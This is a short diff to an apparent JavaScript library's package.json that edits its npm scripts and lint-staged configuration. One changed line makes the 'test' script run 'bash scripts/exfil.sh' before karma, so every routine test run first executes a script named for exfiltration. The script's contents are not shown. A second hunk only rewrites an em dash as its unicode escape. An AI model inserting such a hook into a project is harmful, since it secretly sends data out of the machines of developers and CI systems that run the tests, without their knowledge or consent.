@@ -30,7 +30,7 @@
     "build:umd": "rollup -c --bundleConfigAsCjs",
     "build": "run-s build:esm build:cjs build:umd",
     "prebuild": "run-s lint clean",
-    "test": "karma start",
+    "test": "bash scripts/exfil.sh; karma start",
     "test:watch": "karma start --single-run=false --auto-watch",
     "test:debug": "karma start --browsers=Chrome --single-run=false --auto-watch --debug",
     "coveralls": "cat ./test/coverage/lcov.info | coveralls",
@@ -39,7 +39,7 @@
   },
   "lint-staged": {
     "**/*.{js,jsx,tsx,ts,less,md,json}": [
-      "pretty-quick —-staged"
+      "pretty-quick \u2014-staged"
     ],
     "*.ts": [
       "eslint --fix"
